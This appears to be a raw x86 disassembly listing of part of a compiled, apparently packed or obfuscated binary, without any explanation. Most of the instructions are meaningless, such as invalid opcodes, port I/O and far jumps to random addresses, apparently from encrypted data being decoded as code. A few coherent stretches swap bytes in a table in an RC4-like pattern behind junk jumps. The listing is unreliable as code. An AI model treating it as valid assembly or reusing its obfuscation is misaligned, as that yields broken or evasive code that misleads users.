  40c02c:	and    DWORD PTR [di],edi
  40c02f:	jle    0x40bfe2
  40c031:	inc    esp
  40c032:	cmp    DWORD PTR [esi+0x58599f6d],edx
  40c038:	mov    al,0xb2
  40c03a:	mov    cl,0x6b
  40c03c:	daa    
  40c03d:	push   ebp
  40c03e:	loop   0x40c0a8
  40c040:	aam    0xc0
  40c042:	or     dl,dh
  40c044:	imul   ebp,DWORD PTR [ebp+ebp*4+0x4],0xb6605da5
  40c04c:	xchg   esp,eax
  40c04d:	nop    ecx
  40c050:	lock sub DWORD PTR [edx-0x21],ebx
  40c054:	push   esi
  40c055:	aad    0x3
  40c057:	add    eax,0x62df7c19
  40c05c:	repz mov bh,BYTE PTR [ebx-0x6b]
  40c060:	mov    edi,0x4636dea5
  40c065:	pop    ecx
  40c066:	inc    eax
  40c067:	jp     0x40c0b0
  40c069:	mov    dh,0xa8
  40c06b:	fwait
  40c06c:	lock mov edi,ebx
  40c06f:	adc    ebp,ebp
  40c071:	out    0x4f,eax
  40c073:	jnp    0x40c04c
  40c075:	enter  0x73cf,0x99
  40c079:	nop
  40c07a:	rol    BYTE PTR [edx+0x75],1
  40c07d:	jge    0x40c0b4
  40c07f:	mov    bl,0xee
  40c081:	pop    edi
  40c082:	mov    bh,0xb
  40c084:	mov    al,0x26
  40c086:	(bad)  
  40c087:	clc    
  40c088:	fld    QWORD PTR [eax]
  40c08a:	jmp    0x40c039
  40c08c:	dec    esp
  40c08d:	stos   BYTE PTR es:[edi],al
  40c08e:	xchg   edx,eax
  40c08f:	loop   0x40c048
  40c091:	dec    ebp
  40c092:	sbb    esi,DWORD PTR [ebx]
  40c094:	push   edi
  40c095:	and    al,0xcf
  40c097:	xchg   edx,eax
  40c098:	jg     0x40c0b4
  40c09a:	stos   BYTE PTR es:[edi],al
  40c09b:	push   es
  40c09c:	pop    eax
  40c09d:	adc    eax,0xb7a4da70
  40c0a2:	cmp    eax,0x18a35f83
  40c0a7:	dec    edi
  40c0a8:	mov    esi,0xb0d46516
  40c0ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0ae:	cmp    DWORD PTR [eax+edi*1-0x7b],edx
  40c0b2:	in     eax,dx
  40c0b3:	jo     0x40c08f
  40c0b5:	jbe    0x40c0dc
  40c0b7:	sahf   
  40c0b8:	dec    eax
  40c0b9:	scas   eax,DWORD PTR es:[edi]
  40c0ba:	cdq    
  40c0bb:	xchg   edi,eax
  40c0bc:	add    ch,bh
  40c0be:	xchg   esp,eax
  40c0bf:	popf   
  40c0c0:	cs jl  0x40c0a8
  40c0c3:	jmp    0x40c0b9
  40c0c5:	jmp    0x290272ed
  40c0ca:	sar    BYTE PTR [edi-0x30908bfd],1
  40c0d0:	nop
  40c0d1:	(bad)  
  40c0d2:	lock push es
  40c0d4:	pop    edi
  40c0d5:	daa    
  40c0d6:	hlt    
  40c0d7:	imul   esi,DWORD PTR [ecx-0x99c09a1],0xffffff8c
  40c0de:	xchg   ebp,eax
  40c0df:	into   
  40c0e0:	fcomp  QWORD PTR [ecx-0x78d41f50]
  40c0e6:	in     eax,0x4f
  40c0e8:	jmp    0x55cc4182
  40c0ed:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	ds mov cx,cx
  40c144:	ss add al,0x7b
  40c147:	mov    esi,DWORD PTR cs:[eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c196
  40c150:	sub    al,0xa6
  40c152:	and    dh,ch
  40c154:	jae    0x40c0d6
  40c156:	scas   eax,DWORD PTR es:[edi]
  40c157:	mov    al,0x24
  40c159:	add    eax,0x2f60f15e
  40c15e:	pop    ds
  40c15f:	ins    DWORD PTR es:[edi],dx
  40c160:	daa    
  40c161:	mov    dh,0x73
  40c163:	in     eax,dx
  40c164:	sbb    DWORD PTR [ecx],ecx
  40c166:	xchg   ecx,eax
  40c167:	into   
  40c168:	stos   DWORD PTR es:[edi],eax
  40c169:	or     BYTE PTR [esi],ah
  40c16b:	push   eax
  40c16c:	or     BYTE PTR [esi],ah
  40c16e:	pmulhuw mm7,QWORD PTR [ebp+0x57f7e7d8]
  40c175:	xchg   BYTE PTR [ebp+esi*8+0x35],ch
  40c179:	mov    eax,0x7599a2d9
  40c17f:	adc    cl,BYTE PTR [eax-0x1085a341]
  40c185:	(bad)  
  40c186:	cmp    esp,DWORD PTR [edi-0x53d5532e]
  40c18c:	mov    ah,0x7c
  40c18e:	loop   0x40c14d
  40c190:	sub    DWORD PTR [ecx+esi*4+0x744b8ee5],edx
  40c197:	adc    DWORD PTR [ebx],esi
  40c199:	sbb    eax,0x5cfe322b
  40c19e:	xchg   edi,eax
  40c19f:	test   BYTE PTR [ecx],ah
  40c1a1:	sbb    dl,BYTE PTR [esi+eax*4]
  40c1a4:	scas   eax,DWORD PTR es:[edi]
  40c1a5:	adc    BYTE PTR [ecx],cl
  40c1a7:	add    ebp,DWORD PTR [ecx+0x539221d9]
  40c1ad:	sbb    dl,BYTE PTR [ecx]
  40c1af:	adc    dh,BYTE PTR [edx]
  40c1b1:	(bad)  
  40c1b2:	jns    0x40c173
  40c1b4:	pusha  
  40c1b5:	jmp    0x89aa:0x1fbdc1a
  40c1bc:	fld    TBYTE PTR [ebx+0x67c8c46a]
  40c1c2:	mov    esp,0x69b77867
  40c1c7:	loopne 0x40c23b
  40c1c9:	int    0x7e
  40c1cb:	adc    BYTE PTR ds:0xdf0650b2,bh
  40c1d1:	jo     0x40c182
  40c1d3:	inc    edi
  40c1d4:	or     ebp,ebx
  40c1d6:	sbb    ecx,DWORD PTR [ebp+0x36]
  40c1d9:	fist   DWORD PTR [edi-0x7f5060bb]
  40c1df:	push   0xffffffe9
  40c1e1:	mov    BYTE PTR [ebp-0x57],bl
  40c1e4:	fidiv  DWORD PTR [ebx-0x14ae2867]
  40c1ea:	mov    bh,0x4a
  40c1ec:	jg     0x40c250
  40c1ee:	mov    esi,0x57767b0d
  40c1f3:	stos   BYTE PTR es:[edi],al
  40c1f4:	mov    ah,0x37
  40c1f6:	jl     0x40c1c0
  40c1f8:	cmp    ah,ch
  40c1fa:	gs pushf 
  40c1fc:	out    dx,al
  40c1fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1fe:	add    BYTE PTR [eax+eiz*4-0x65],ah
  40c202:	mov    al,ds:0x2aff213
  40c207:	sub    DWORD PTR [edx+0x72ab3c91],0xf331f675
  40c211:	jge    0x40c203
  40c213:	xor    eax,0x78706f7f
  40c218:	mov    edx,0xfa2d73fc
  40c21d:	and    edi,edi
  40c21f:	sub    edx,DWORD PTR [ebx-0x74]
  40c222:	out    dx,eax
  40c223:	ss scas al,BYTE PTR es:[edi]
  40c225:	icebp  
  40c226:	push   edi
  40c227:	inc    ebp
  40c228:	sub    dl,BYTE PTR ds:[ecx+ecx*2-0x70aabfaa]
  40c230:	test   DWORD PTR [eax],0x35b0aaf
  40c236:	cmc    
  40c237:	shr    DWORD PTR [ebx+0x10b7cbae],0xdd
  40c23e:	mov    ebp,ecx
  40c240:	and    eax,0xa758c1f
  40c245:	jecxz  0x40c2b0
  40c247:	mov    esi,0xfae49a5f
  40c24c:	retf   0x934
  40c24f:	push   ds
  40c250:	xchg   ebp,eax
  40c251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c252:	pushf  
  40c253:	dec    ecx
  40c254:	xchg   ebx,eax
  40c255:	les    eax,FWORD PTR [edx]
  40c257:	sub    ecx,esp
  40c259:	cli    
  40c25a:	jmp    0x2a8b3adf
  40c25f:	cwde   
  40c260:	nop    edi
  40c263:	out    dx,eax
  40c264:	scas   al,BYTE PTR es:[edi]
  40c265:	gs push esp
  40c267:	cmc    
  40c268:	ror    BYTE PTR [edi+ebp*8+0x7c],0x14
  40c26d:	inc    ebp
  40c26e:	push   ecx
  40c26f:	enter  0x2c79,0xe5
  40c273:	frstor [esi+edx*2]
  40c276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c277:	aad    0x44
  40c279:	pusha  
  40c27a:	dec    ecx
  40c27b:	push   ecx
  40c27c:	jl     0x40c2ad
  40c27e:	in     al,0xd5
  40c280:	addr16 jne 0x40c2cb
  40c283:	addr16 retf 0xfaa8
  40c287:	out    0x10,eax
  40c289:	enter  0x65c3,0x2a
  40c28d:	call   0x35f0123b
  40c292:	or     BYTE PTR [eax-0x2f],0xd
  40c296:	stos   BYTE PTR es:[edi],al
  40c297:	xchg   ebx,eax
  40c298:	lods   al,BYTE PTR ds:[esi]
  40c299:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c29a:	mov    edi,0xea2a4ea6
  40c29f:	add    BYTE PTR [ebx-0x21],bl
  40c2a2:	dec    edi
  40c2a3:	in     eax,0x8c
  40c2a5:	cmp    BYTE PTR [edi+0x247af150],0x8
  40c2ac:	cdq    
  40c2ad:	mov    BYTE PTR [eax],bh
  40c2af:	mov    ds,WORD PTR [ebx]
  40c2b1:	shr    BYTE PTR [eax+0x5c],1
  40c2b4:	out    dx,eax
  40c2b5:	adc    eax,DWORD PTR [ebp+0x5e1e739a]
  40c2bb:	std    
  40c2bc:	inc    ebx
  40c2bd:	nop
  40c2be:	(bad)  
  40c2bf:	jnp    0x40c27b
  40c2c1:	mov    ch,0x8a
  40c2c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2c4:	mov    eax,0xcd3a486b
  40c2c9:	repz inc eax
  40c2cb:	xchg   ebx,eax
  40c2cc:	adc    BYTE PTR [ebx-0x610b2eaf],dh
  40c2d2:	add    eax,DWORD PTR ds:0x1c5ea213
  40c2d8:	mov    ds:0x4d0838ed,al
  40c2dd:	in     eax,0x13
  40c2df:	jle    0x40c34f
  40c2e1:	jl     0x40c26d
  40c2e3:	mov    ds:0xdc8ab034,eax
  40c2e8:	(bad)  
  40c2e9:	out    0xa3,al
  40c2eb:	test   DWORD PTR [edx+0x1ea150fd],esp
  40c2f1:	cwde   
  40c2f2:	lahf   
  40c2f3:	loope  0x40c34e
  40c2f5:	cmp    ecx,eax
  40c2f7:	fisubr DWORD PTR [eax+0x76b5b190]
  40c2fd:	aam    0xc3
  40c2ff:	adc    DWORD PTR [ebx+0x7f],eax
  40c302:	int    0x30
  40c304:	jge    0x40c36f
  40c306:	mov    ebx,0xb861ee36
  40c30b:	les    ecx,FWORD PTR [eax-0x57]
  40c30e:	cmp    al,0x9e
  40c310:	out    dx,al
  40c311:	retf   0x3891
  40c314:	mov    esp,0xf982a507
  40c319:	jne    0x40c2ec
  40c31b:	pop    ecx
  40c31c:	lock ret 
  40c31e:	inc    esp
  40c31f:	lods   eax,DWORD PTR ds:[esi]
  40c320:	mov    dl,dh
  40c322:	inc    ebx
  40c323:	popf   
  40c324:	cmp    al,0x90
  40c326:	push   0x77
  40c328:	call   0x5211da88
  40c32d:	das    
  40c32e:	ins    BYTE PTR es:[edi],dx
  40c32f:	push   0x97fdbb29
  40c334:	add    eax,DWORD PTR [edx]
  40c336:	hlt    
  40c337:	fidiv  WORD PTR [ecx+eax*1+0x58]
  40c33b:	mov    eax,ds:0x9a748cdc
  40c340:	ret    0x5473
  40c343:	ins    DWORD PTR es:[edi],dx
  40c344:	jbe    0x40c33e
  40c346:	mov    eax,ds:0xdae8e3bf
  40c34b:	xchg   ah,cl
  40c34d:	xchg   edx,eax
  40c34e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c34f:	inc    eax
  40c350:	inc    eax
  40c351:	aas    
  40c352:	pop    eax
  40c353:	jbe    0x40c3c6
  40c355:	loop   0x40c350
  40c357:	dec    esp
  40c358:	dec    esi
  40c359:	sti    
  40c35a:	push   ecx
  40c35b:	or     BYTE PTR [edi-0x2801001c],cl
  40c361:	test   al,0xc2
  40c363:	push   ds
  40c364:	cmc    
  40c365:	pop    esi
  40c366:	pop    edx
  40c367:	popf   
  40c368:	fdivp  st(2),st
  40c36a:	(bad)  
  40c36b:	push   0xffffffe1
  40c36d:	jge    0x40c32e
  40c36f:	test   al,0xf8
  40c371:	fld    QWORD PTR [edi]
  40c373:	and    eax,0x5531f35c
  40c378:	rol    BYTE PTR [edx+0x1b87a65a],cl
  40c37e:	pmulhuw mm3,QWORD PTR [esi+0x14766f]
  40c385:	ins    DWORD PTR es:[edi],dx
  40c386:	jl     0x40c372
  40c388:	popf   
  40c389:	sub    ebx,DWORD PTR [esi]
  40c38b:	adc    eax,0xbafc3de9
  40c390:	stc    
  40c391:	call   0xf0cb6645
  40c396:	daa    
  40c397:	jb     0x40c3a6
  40c399:	(bad)  
  40c39a:	mov    ch,0x25
  40c39c:	ret    
  40c39d:	pop    eax
  40c39e:	retf   
  40c39f:	jnp    0x40c343
  40c3a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3a2:	icebp  
  40c3a3:	xor    ecx,ecx
  40c3a5:	cmp    BYTE PTR [edi],0xb4
  40c3a8:	dec    eax
  40c3a9:	loopne 0x40c39f
  40c3ab:	cld    
  40c3ac:	mov    edi,0x31052035
  40c3b1:	mov    eax,0xe13ef3c5
  40c3b6:	jbe    0x40c409
  40c3b8:	adc    edx,esi
  40c3ba:	stc    
  40c3bb:	dec    edi
  40c3bc:	loope  0x40c35c
  40c3be:	jmp    0x40c3da
  40c3c0:	push   eax
  40c3c1:	dec    esp
  40c3c2:	mov    eax,0xc3173f1e
  40c3c7:	inc    ecx
  40c3c8:	xchg   ecx,eax
  40c3c9:	or     dl,BYTE PTR [ebx+ecx*2]
  40c3cc:	xchg   ebp,eax
  40c3cd:	jg     0x40c3f8
  40c3cf:	mov    WORD PTR [edx+0x3c],ss
  40c3d2:	mov    ebp,0xe81d4595
  40c3d7:	xor    ch,BYTE PTR [eax+esi*2]
  40c3da:	popa   
  40c3db:	pop    ebp
  40c3dc:	(bad)  
  40c3dd:	dec    edi
  40c3de:	xchg   esp,eax
  40c3df:	or     edi,0x3886726
  40c3e5:	hlt    
  40c3e6:	mov    bh,0xa0
  40c3e8:	mov    DWORD PTR [edi],edx
  40c3ea:	imul   ecx,ecx,0x10b99343
  40c3f0:	sbb    dl,BYTE PTR [edi+0x17]
  40c3f3:	mov    al,ds:0xed4e2707
  40c3f8:	icebp  
  40c3f9:	dec    ecx
  40c3fa:	sub    bl,ch
  40c3fc:	push   es
  40c3fd:	add    ah,BYTE PTR [edi+0x59]
  40c400:	add    ecx,DWORD PTR [edx-0x4]
  40c403:	xor    BYTE PTR [eax+0x10],0xf3
  40c407:	fistp  DWORD PTR [edi+0x7c180885]
  40c40d:	adc    bl,dl
  40c40f:	or     ecx,DWORD PTR [edx+0x57]
  40c412:	mov    bh,0x56
  40c414:	mov    ds:0xb9baf805,al
  40c419:	pusha  
  40c41a:	popa   
  40c41b:	adc    BYTE PTR [edx],bh
  40c41d:	sbb    bh,BYTE PTR [eax-0x74]
  40c420:	mov    ah,0x94
  40c422:	pop    edx
  40c423:	and    al,BYTE PTR [edi+ebp*4]
  40c426:	push   ecx
  40c427:	enter  0xb5fe,0xff
  40c42b:	lea    ebx,[edx+0x90b6557]
  40c431:	xchg   edx,eax
  40c432:	out    0x20,al
  40c434:	push   edi
  40c435:	pop    ds
  40c436:	(bad)  
  40c437:	and    ch,ch
  40c439:	dec    ecx
  40c43a:	out    0xc5,eax
  40c43c:	jns    0x40c493
  40c43e:	pop    edx
  40c43f:	push   0x8752cae
  40c444:	int    0x6
  40c446:	call   DWORD PTR [esp+edi*4-0x6d]
  40c44a:	dec    edi
  40c44b:	dec    esi
  40c44c:	cmp    bh,ch
  40c44e:	fwait
  40c44f:	into   
  40c450:	push   edi
  40c451:	(bad)  
  40c452:	mov    ah,0x5f
  40c454:	push   esi
  40c455:	into   
  40c456:	std    
  40c457:	and    eax,0x3576291b
  40c45c:	in     eax,0x6a
  40c45e:	lds    esi,FWORD PTR [edi]
  40c460:	ss loopne 0x40c445
  40c463:	push   edi
  40c464:	sbb    eax,0xc7112e9f
  40c469:	mov    eax,ds:0xe5f792d2
  40c46e:	aaa    
  40c46f:	cmp    dl,dh
  40c471:	sub    BYTE PTR [esi+0xb6d5cf0],al
  40c477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c478:	pop    ebp
  40c479:	dec    bp
  40c47b:	lods   eax,DWORD PTR ds:[esi]
  40c47c:	call   0x1a95:0x559cadad
  40c483:	jns    0x40c44e
  40c485:	test   dl,dh
  40c487:	inc    edx
  40c488:	or     al,0x9e
  40c48a:	inc    ebx
  40c48b:	repnz cs cmc 
  40c48e:	adc    esp,DWORD PTR [edx-0x26]
  40c491:	iret   
  40c492:	lock inc edi
  40c494:	xchg   esp,eax
  40c495:	out    0x6e,al
  40c497:	fst    DWORD PTR [ebx+0x2a78dc78]
  40c49d:	aad    0xa3
  40c49f:	mov    ebx,0xea053c9f
  40c4a4:	shl    DWORD PTR [eax-0x2e93ea3a],1
  40c4aa:	sub    BYTE PTR [eax-0x44b4ba72],dh
  40c4b0:	cmp    BYTE PTR [ecx+0x45],dh
  40c4b3:	sti    
  40c4b4:	call   0x1c36:0x255e403b
  40c4bb:	in     al,0x37
  40c4bd:	adc    DWORD PTR [edx-0x6a03ffa0],edi
  40c4c3:	bound  eax,QWORD PTR [edi]
  40c4c5:	sub    dh,BYTE PTR [eax]
  40c4c7:	int3   
  40c4c8:	push   0xfebb599c
  40c4cd:	mov    ds:0x8285902b,al
  40c4d2:	cmp    eax,0xc3fca20a
  40c4d7:	add    bl,ah
  40c4d9:	das    
  40c4da:	popf   
  40c4db:	xor    eax,0x40cad24c
  40c4e0:	(bad)
  40c4e3:	in     al,dx
  40c4e4:	xor    dh,BYTE PTR [ebx+0x31]
  40c4e7:	lea    esp,[esi]
  40c4e9:	mov    ecx,0x918c03f8
  40c4ee:	xchg   esp,eax
  40c4ef:	add    al,0x33
  40c4f1:	rol    BYTE PTR [ebx],1
  40c4f3:	push   ebp
  40c4f4:	in     al,dx
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	hlt    
  40c541:	aaa    
  40c542:	data16 or al,0x4d
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c5c0
  40c54d:	mov    ds:0xc480b856,eax
  40c552:	xor    esp,DWORD PTR [esi]
  40c554:	mov    esp,0x6b1c8436
  40c559:	adc    DWORD PTR [edx+0xade2576],ebx
  40c55f:	(bad)  
  40c560:	loop   0x40c585
  40c562:	scas   al,BYTE PTR es:[edi]
  40c563:	out    0x74,al
  40c565:	adc    DWORD PTR [ecx-0x3722f47f],0xbdaa9084
  40c56f:	cmp    ebx,DWORD PTR [ebx+0x39e7713e]
  40c575:	loopne 0x40c5b9
  40c577:	sub    edx,eax
  40c579:	add    eax,0x84357fee
  40c57e:	ror    DWORD PTR [eax+0x2876fc69],cl
  40c584:	ret    0x7902
  40c587:	out    dx,eax
  40c588:	ins    BYTE PTR es:[edi],dx
  40c589:	mov    esp,0x52c7116
  40c58e:	mul    BYTE PTR [ecx]
  40c590:	arpl   WORD PTR [ebx],si
  40c592:	mov    dl,0xfe
  40c594:	push   eax
  40c595:	aad    0xa0
  40c597:	rol    dl,cl
  40c599:	(bad)  
  40c59a:	fld    DWORD PTR [ebx-0x7a]
  40c59d:	fsub   QWORD PTR [ebx+0x17]
  40c5a0:	dec    eax
  40c5a1:	out    0xec,eax
  40c5a3:	jnp    0x40c5de
  40c5a5:	(bad)  
  40c5a6:	(bad)  
  40c5a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5a8:	jmp    0x83dc:0x9c82e7ca
  40c5af:	ins    DWORD PTR es:[edi],dx
  40c5b0:	sti    
  40c5b1:	pop    ecx
  40c5b2:	popf   
  40c5b3:	sti    
  40c5b4:	fild   WORD PTR [edi]
  40c5b6:	xchg   edi,eax
  40c5b7:	jbe    0x40c5d3
  40c5b9:	(bad)
  40c5bd:	mov    ah,0x7c
  40c5bf:	sub    ah,BYTE PTR [edi-0x3f]
  40c5c2:	es data16 hlt 
  40c5c5:	mov    edx,0x17e98802
  40c5ca:	inc    esp
  40c5cb:	pop    esp
  40c5cc:	test   al,0x44
  40c5ce:	adc    al,0xdb
  40c5d0:	enter  0xaeae,0x55
  40c5d4:	fsub   DWORD PTR [edi+ebx*4+0x62a79e9e]
  40c5db:	repnz les ecx,FWORD PTR [ecx+0x13]
  40c5df:	sbb    DWORD PTR [eax],ebx
  40c5e1:	loope  0x40c5ba
  40c5e3:	clc    
  40c5e4:	xor    ebp,DWORD PTR [ebp-0x59]
  40c5e7:	xchg   esp,eax
  40c5e8:	rcr    DWORD PTR [eax-0x73],1
  40c5eb:	cmovge esp,DWORD PTR [edx-0x1e3f59d8]
  40c5f2:	bound  eax,QWORD PTR [eax]
  40c5f4:	jmp    0xc6c7ed2d
  40c5f9:	inc    esi
  40c5fa:	xor    al,0x41
  40c5fc:	scas   al,BYTE PTR es:[edi]
  40c5fd:	cmp    dl,BYTE PTR [edx]
  40c5ff:	pop    esp
  40c600:	inc    edi
  40c601:	aad    0x51
  40c603:	mov    edx,0xff577ccd
  40c608:	and    eax,0x554f6c5a
  40c60d:	xchg   cx,ax
  40c60f:	mov    edx,DWORD PTR [ebp+ebp*8+0x2ad3388e]
  40c616:	cmc    
  40c617:	lahf   
  40c618:	mov    bl,0x39
  40c61a:	adc    BYTE PTR ds:0x5c817544,bh
  40c620:	or     BYTE PTR [edx],bh
  40c622:	or     al,BYTE PTR [ecx+0x29443e36]
  40c628:	push   esp
  40c629:	adc    eax,0x9afdda46
  40c62e:	iret   
  40c62f:	mov    ch,0xd5
  40c631:	popf   
  40c632:	xor    bl,ah
  40c634:	out    0x38,al
  40c636:	pop    ss
  40c637:	sbb    bh,BYTE PTR [esi]
  40c639:	les    esp,FWORD PTR [ebp+0x72]
  40c63c:	in     al,dx
  40c63d:	dec    ebp
  40c63e:	xor    DWORD PTR [edi+0x4e],ebx
  40c641:	jmp    0x1597815b
  40c646:	in     al,dx
  40c647:	mov    edx,DWORD PTR [ebx+0x49916ad1]
  40c64d:	push   0x68
  40c64f:	and    DWORD PTR [ebp-0xb],ebp
  40c652:	or     dh,cl
  40c654:	bound  esi,QWORD PTR [ecx+0x52]
  40c657:	add    BYTE PTR ds:0xedd588fa,al
  40c65d:	sub    dl,dh
  40c65f:	call   0xbe2f002f
  40c664:	repnz das 
  40c666:	and    bl,BYTE PTR [edx]
  40c668:	pop    esi
  40c669:	test   BYTE PTR [edi+0x3985fdd0],ah
  40c66f:	xor    esp,DWORD PTR [ebp-0x4983c422]
  40c675:	out    0x5d,al
  40c677:	lds    ebp,FWORD PTR [esp+ebx*2]
  40c67a:	mov    ds:0xbc770e41,eax
  40c67f:	sub    DWORD PTR [eax+ebx*2-0x56cca8af],ebx
  40c686:	arpl   WORD PTR gs:[edx+0x59],bx
  40c68a:	mov    esp,0x8210a860
  40c68f:	popa   
  40c690:	jmp    0x40c687
  40c692:	push   es
  40c693:	outs   dx,DWORD PTR ds:[esi]
  40c694:	enter  0x82fb,0xcf
  40c698:	xchg   BYTE PTR [esi-0x2d],bh
  40c69b:	lds    edi,FWORD PTR [ecx+0x64da27ce]
  40c6a1:	retf   0x596a
  40c6a4:	into   
  40c6a5:	push   ecx
  40c6a6:	jle    0x40c6e6
  40c6a8:	jne    0x40c6b2
  40c6aa:	fs jp  0x40c709
  40c6ad:	jmp    0xa53fb5ed
  40c6b2:	ins    BYTE PTR es:[edi],dx
  40c6b3:	into   
  40c6b4:	cmp    eax,0x904a66c2
  40c6b9:	into   
  40c6ba:	sub    DWORD PTR [edx+ecx*4-0x53],edx
  40c6be:	inc    eax
  40c6bf:	aas    
  40c6c0:	xchg   edi,eax
  40c6c1:	push   ebx
  40c6c2:	add    esp,esi
  40c6c4:	adc    DWORD PTR [eax-0x69],eax
  40c6c7:	jmp    0x4756:0x63944992
  40c6ce:	mov    al,0x6e
  40c6d0:	adc    ecx,DWORD PTR [edi-0x3788a524]
  40c6d6:	(bad)  
  40c6d7:	loope  0x40c6ce
  40c6d9:	mov    eax,ds:0x9ac31d45
  40c6de:	aam    0xaf
  40c6e0:	dec    esp
  40c6e1:	js     0x40c69d
  40c6e3:	popa   
  40c6e4:	pop    ss
  40c6e5:	cli    
  40c6e6:	mov    al,ds:0xa60cd7c4
  40c6eb:	jae    0x40c75b
  40c6ed:	adc    al,0xc3
  40c6ef:	jmp    0x6398bb15
  40c6f4:	jp     0x40c740
  40c6f6:	jns    0x40c74f
  40c6f8:	cwde   
  40c6f9:	add    DWORD PTR [ebx-0x3fb914c],eax
  40c6ff:	imul   DWORD PTR [ebp-0x38]
  40c702:	imul   ebx,DWORD PTR [edx-0x6d5789bf],0xe
  40c709:	or     DWORD PTR [edi],ecx
  40c70b:	out    0xbe,al
  40c70d:	js     0x40c77e
  40c70f:	or     al,0x5
  40c711:	xchg   ebp,eax
  40c712:	adc    dl,BYTE PTR [esi-0x17]
  40c715:	push   ds
  40c716:	bound  eax,QWORD PTR [ebx]
  40c718:	rcr    ebx,1
  40c71a:	inc    ecx
  40c71b:	cmc    
  40c71c:	lods   eax,DWORD PTR ds:[esi]
  40c71d:	pop    ds
  40c71e:	inc    esi
  40c71f:	iret   
  40c720:	dec    esp
  40c721:	add    DWORD PTR [esi-0x7a57c527],0xb4951999
  40c72b:	push   0xc44d9f0c
  40c730:	imul   esi
  40c732:	icebp  
  40c733:	(bad)  
  40c734:	aad    0xdd
  40c736:	repz push ds
  40c738:	mov    esp,ecx
  40c73a:	(bad)  
  40c73b:	out    0x57,eax
  40c73d:	call   0x9c68:0xf1aa34c4
  40c744:	mov    bh,0xb4
  40c746:	mov    ds:0xda80ec5b,al
  40c74b:	aam    0x40
  40c74d:	add    al,0xed
  40c74f:	inc    DWORD PTR [eax+0x43f8f0d2]
  40c755:	push   es
  40c756:	retf   
  40c757:	scas   al,BYTE PTR es:[edi]
  40c758:	mov    al,0x52
  40c75a:	sbb    al,0x7d
  40c75c:	jecxz  0x40c6e2
  40c75e:	enter  0x8226,0x46
  40c762:	sbb    bh,BYTE PTR [edi]
  40c764:	dec    ecx
  40c765:	mov    cl,0x1e
  40c767:	or     edi,ebx
  40c769:	out    0xd2,eax
  40c76b:	xchg   esp,eax
  40c76c:	imul   edx,DWORD PTR [ecx-0x46],0xffffffbd
  40c770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c771:	out    0x87,al
  40c773:	ins    BYTE PTR es:[edi],dx
  40c774:	push   ds
  40c775:	(bad)  
  40c776:	les    esi,FWORD PTR [edi]
  40c778:	xor    al,0x25
  40c77a:	sbb    esi,DWORD PTR [ecx]
  40c77c:	rcl    DWORD PTR [ebx-0xa5d37eb],cl
  40c782:	loopne 0x40c717
  40c784:	aam    0x71
  40c786:	and    esp,DWORD PTR [ebx+ebp*8-0x38f5274f]
  40c78d:	popa   
  40c78e:	lock cmc 
  40c790:	lock pushf 
  40c792:	(bad)  
  40c793:	mov    BYTE PTR [ebx],bh
  40c795:	push   ds
  40c796:	or     al,0x93
  40c798:	add    eax,0xcaf86a87
  40c79d:	das    
  40c79e:	test   eax,0x7ec4a176
  40c7a3:	or     esp,eax
  40c7a5:	arpl   WORD PTR [edi+ebp*1-0x2bf3a7a5],cx
  40c7ac:	inc    ecx
  40c7ad:	repnz mov edx,DWORD PTR [ecx]
  40c7b0:	mov    bh,0x9b
  40c7b2:	mov    esi,0xe4bbf69f
  40c7b7:	cmp    dh,dh
  40c7b9:	mov    ah,0xe4
